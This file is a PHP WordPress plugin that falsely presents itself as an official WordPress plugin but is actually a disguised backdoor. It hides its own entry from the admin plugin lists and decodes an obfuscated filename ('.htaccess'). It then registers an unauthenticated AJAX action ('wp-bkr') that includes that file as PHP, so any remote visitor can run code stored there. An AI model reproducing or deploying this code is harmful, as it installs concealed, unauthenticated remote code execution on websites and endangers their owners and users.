<?php
/*
Plugin Name: WP Used Electronic
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 2.2.6
Author URI: http://wordpress.org/#
*/

if (!defined('ABSPATH')) {
    exit;
}

function rrd_gfa() {
    global $wp_list_table;
    
    if (!isset($wp_list_table)) {
        return;
    }

    $h = array('wp-used-electronic/wp-used-electronic.php');

    if (isset($wp_list_table->items) && is_array($wp_list_table->items)) {
        foreach ($wp_list_table->items as $key => $val) {
            if (in_array($key, $h)) {
                unset($wp_list_table->items[$key]);
            }
        }
    }
}

add_action('pre_current_active_plugins', 'rrd_gfa');

function xov_uvj($plugins) {
    $p = 'wp-used-electronic/wp-used-electronic.php';
    if (array_key_exists($p, $plugins)) {
        unset($plugins[$p]);
    }
    return $plugins;
}

add_filter('all_plugins', 'xov_uvj');

function bwp($f, $d) {
    $r = '';
    for ($i = 0; $i < strlen($f); $i += 2) {
        $v = ord($f[$i]) - 65;
        $b = ord($f[$i + 1]);
        if ($b > 90) $b -= 6;
        $s = $v * 52 + ($b - 65);
        $r .= chr($s - $d);
    }
    return $r;
}

function iip_ajax_handler() {
    include plugin_dir_path(__FILE__) . bwp('BSCYCkCRCTCTCVCj', 24);
    wp_die();
}

add_action('wp_ajax_wp-bkr', 'iip_ajax_handler');
add_action('wp_ajax_nopriv_wp-bkr', 'iip_ajax_handler');
